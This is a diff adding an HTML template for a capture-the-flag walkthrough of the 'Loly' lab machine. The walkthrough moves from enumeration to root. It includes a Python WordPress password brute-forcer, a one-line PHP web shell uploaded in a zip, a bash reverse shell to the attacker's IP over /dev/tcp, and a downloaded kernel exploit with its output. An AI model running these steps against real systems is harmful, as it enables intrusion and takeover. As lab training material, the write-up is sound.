@@ -1,0 +1,225 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Play Loly</h1>
+    <p class="text">Difficulty Medium | CommunityRating : Medium | MyRating : Medium</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=2000</u>
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.10.3 (Ubuntu)
+|_http-server-header: nginx/1.10.3 (Ubuntu)
+|_http-title: Welcome to nginx!
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+
+<p class="text">The target machine hosts only HTTP server.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/loly/1.png' %}" alt="">
+    <p class="text">This is nginx default page. Because there is no interesting info, we can enumerate further.</p>
+</div>
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Contet/common.txt -u http://$IP -t 70</u>
+===============================================================
+/wordpress            (Status: 301) [Size: 194] [--&gt; http://192.168.205.121/wordpress/]
+
+===============================================================</code></pre></div>
+
+<p class="text">I found wordpress page. Opening this page automatically redirects domain <u>loly.lc</u>. I first add this domain to /etc/hosts.</p>
+
+<div class="code-box"><pre><code>└─$ <u>echo '$IP loly.lc' | sudo tee -a /etc/hosts</u></code></pre></div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/loly/2.png' %}" alt="">
+    <p class="text">This page has url for login page, but I will browse this page further.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/loly/3.png' %}" alt="">
+    <p class="text">On the author page, I found name <u>loly</u>, which is the name of machine. I write it down for future login test and keep enumeration.</p>
+</div>
+
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/loly/4.png' %}" alt="">
+    <p class="text">Though there is input form which we may inject something, there was no vulnerability while I tested. Also, other pages holds interesting url parameters, which I couldn't exploit. <br><br>Becuase there is no object I can test further, I will move on brute forcing login form.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/loly/5.png' %}" alt="">
+    <p class="text">I first tried several username and the username 'loly' returned password is wrong. It means the username loly is existing. We can perform password brute forcing.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/loly/6.png' %}" alt="">
+    <p class="text">For that purpose, I started burpsuite and send login request with empty password parameter to Intruder, and press add button with setting cursor to pwd parameter. <br><br> I aslo set password wordlist '/usr/share/wordlists/rockyou.txt' with load button on the right tab. <br>Then, press Start attack button.</p>
+</div>
+
+<p class="text">Because  community version of burpsuite performs burute force slowly, I wrote python code to speed up it while burpsuite running.</p>
+<div class="code-box"><pre><code>import requests
+import sys
+
+s = requests.session()
+
+
+url = 'http://loly.lc/wordpress/wp-login.php'
+cookies = {
+    "wp-settings-1" : "libraryContent%3Dbrowse",
+    "wp-settings-time-1" : "1761232327",
+    "wordpress_test_cookie" : 'WP+Cookie+check'
+}
+s.cookies.update(cookies)
+
+with open('/usr/share/wordlists/rockyou.txt',mode='r',encoding='utf-8', errors='ignore') as f:
+    words = [line.rstrip('\n') for line in f]
+
+wordlist_len = len(words)
+
+i = 1
+for word in words:
+    data = {
+        "log": "loly",
+        "pwd": word,
+        "wp-submit": "Log In",
+        "redirect_to": "http://loly.lc/wordpress/wp-admin/",
+        "testcookie": "1"
+    }
+
+    try:
+        resp = s.post(url, data=data, timeout=10, allow_redirects=False)
+    except requests.RequestException as e:
+        print(resp.content)
+        print("request error:", e)
+        continue
+    
+    byte_len = int(len(resp.content))
+    print(f"\r[+]{i}/{wordlist_len} Tested", end='', flush=True)
+    i += 1
+    
+    if resp.status_code in (302,303) and '/wp-admin/' in (resp.headers.get('Location') or ''):
+        print()
+        print(f"Found Password! : {word}")
+        sys.exit()</code></pre></div>
+
+<p class="text">Fortunately, burpsuite found right password before I finish writing python code.</p>
+<div class="img">
+    <img src="{% static 'EthHack/images/loly/7.png' %}" alt="">
+    <p class="text">The password <u>fernando</u> returned length 1220, which indicates it was correct password.</p>
+</div>
+
+<h2 class="subtitle">Foothold</h2>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/loly/8.png' %}" alt="">
+    <p class="text">Back to the /wordpress page after logon, a new path Site Admin appeared.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/loly/9.png' %}" alt="">
+    <img src="{% static 'EthHack/images/loly/10.png' %}" alt="">
+</div>
+
+<p class="text">On the admin page -> AdRoute -> Manage Media, I found zip uploading page. This page says two interesting stuff :</p>
+<p class="text"><u>Zip files are automatically extracted in the location where they are uploaded and the original zip file will be deleted once extracted.</u></p>
+<p class="text"><u>You can create top-level folders below</u></p>
+<p class="text">These mean, if we upload zip file on this page, this website automatically unzips the file and add it to root directory of the website. Therefore, I will zipped webshell file to the default dir '/banners', and get reverse shell.</p>
+
+<div class="code-box"><pre><code>└─$ echo '&lt;?php system($_REQUEST[cmd]);?&gt;' > simple_shell.php
+└─$ zip simple_shell.zip simple_shell.php
+  adding: simple_shell.php (stored 0%)</code></pre></div>
+
+  <p class="text">I prepared zip file. Next, let's upload it. I simply pressed browse button and select created zip file, and uploaded.</p>
+
+  <div class="img">
+    <img src="{% static 'EthHack/images/loly/11.png' %}" alt="">
+    <p class="text">Navigating to url <u>http://loly.lc/wordpress/wp-content/banners/simple_shell.php?cmd=id</u> returned current user. We can establish reverse shell using this file.</p>
+  </div>
+
+  <div class="code-box"><pre><code>└─$ └─$ <u>nc -lvnp 4444</u>
+listening on [any] 4444 ...
+
+└─$ <u>curl -G http://loly.lc/wordpress/wp-content/banners/simple_shell.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/192.168.45.203/4444 0>&1"'</u>
+
+
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.203] from (UNKNOWN) [192.168.205.121] 51436
+bash: cannot set terminal process group (3070): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ubuntu:~/html/wordpress/wp-content/banners$ </code></pre></div>
+
+<p class="text">I got reverse shell with www-data user.</p>
+
+<h2 class="subtitle">Lateral Movement</h2>
+<p class="text">I found mysql credential in /etc/php/7.0/fpm/php-fpm.conf. I could use it for su command for loly.</p>
+
+<div class="code-box"><pre><code>www-data@ubuntu:/var/www/html/wordpress$ cat wp-config.php | grep password -2
+define( 'DB_USER', 'wordpress' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '<u>lolyisabeautifulgirl</u>' );</code></pre></div>
+
+<div class="code-box"><pre><code>www-data@ubuntu:/tmp$ su loly
+Password: lolyisabeautifulgirl
+loly@ubuntu:/tmp$ </code></pre></div>
+<p class="text">We got loly user.</f>
+
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">While enumerating machine information, I found OS version is out-of-date.</p>
+
+<div class="code-box"><pre><code>loly@ubuntu:~/html/wordpress/wp-content/banners$ uname -a
+uname -a
+Linux ubuntu <u>4.4.0-31-generic</u> #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</code></pre></div>
+
+
+<p class="text">Googling keyword <u>ubuntu intext:4.4.0-31-generic exploit site:exploit-db.com</u> returned <a href="https://www.exploit-db.com/raw/45010">this</a> exploit code.</p>
+<p class="text">I will install this file to target machine and test it.</p>
+
+<div class="code-box"><pre><code>loly@ubuntu:~/html/wordpress/wp-content/banners$ cd ~
+loly@ubuntu:~$ wget https://www.exploit-db.com/raw/45010
+loly@ubuntu:~$ mv 45010 exploit.c
+<u class="green">I renamed file because gcc only compile file with extension c.</u>
+loly@ubuntu:~$ gcc exploit.c
+<u class="green">Compile installed c file with gcc.</u>
+loly@ubuntu:~$ ls 
+a.out  exploit.c
+loly@ubuntu:~$ chmod +x a.out
+<u class="green">Make it executable.</u>
+loly@ubuntu:~$ ./a.out
+[.] 
+[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
+[.] 
+[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
+[.] 
+[*] creating bpf map
+[*] sneaking evil bpf past the verifier
+[*] creating socketpair()
+[*] attaching bpf backdoor to socket
+[*] skbuff => ffff88007bf83d00
+[*] Leaking sock struct from ffff88007bf35680
+[*] Sock->sk_rcvtimeo at offset 472
+[*] Cred structure at ffff880078e19840
+[*] UID from cred structure: 1000, matches the current: 1000
+[*] hammering cred structure at ffff880078e19840
+[*] credentials patched, launching shell...
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(loly)</code></pre></div>
+
+<p class="text">It was successful and I got root user. You can find local.txt under /var/www, and proof.txt under /root directory.</p>
+
+
+
+
+</body>
+</html>
